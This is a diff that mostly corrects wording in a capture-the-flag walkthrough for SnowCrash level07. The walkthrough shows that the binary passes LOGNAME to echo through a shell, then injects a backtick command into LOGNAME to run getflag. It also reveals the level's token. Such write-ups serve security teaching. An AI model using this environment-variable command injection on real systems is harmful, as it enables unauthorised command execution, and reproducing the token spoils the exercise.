@@ -2,7 +2,7 @@
 
 ---
 
-In this level we have a compiled file called `level07`.
+In this level, we have a compiled file called `level07`.
 
 ```shell
 $ gdb -q level07
@@ -35,12 +35,12 @@ End of assembler dump.
 0x804b070:	 "/bin/echo level07 "
 ```
 
-This program get the environment variable called `LOGNAME`, then use `echo` with this variable as parameter.
+This program gets the environment variable called `LOGNAME`, then uses `echo` with this variable as a parameter.
 
-So I will use this echo function to execute `getflag`.
+So, I will use this `echo` function to execute `getflag`.
 
 ```shell
 $ export LOGNAME='`getflag`'
 level07@SnowCrash:~$ ./level07
-Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+Check flag. Here is your token: fiumuikeil55xe9cu4dood66h
 ```
